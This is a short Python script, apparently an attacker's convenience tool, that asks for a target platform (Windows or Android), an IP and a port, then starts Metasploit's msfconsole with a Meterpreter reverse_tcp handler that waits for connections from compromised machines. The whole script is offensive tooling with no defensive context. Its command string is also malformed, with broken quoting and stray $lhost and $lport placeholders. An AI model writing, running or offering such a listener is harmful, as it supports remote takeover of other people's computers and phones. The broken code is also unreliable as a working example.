import os
payload = input("Payload type to listen hem windows or android ? ")
os.system("ifconfig")
ip = input("Your ip ? ")
port = input("Your port ? ")
os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
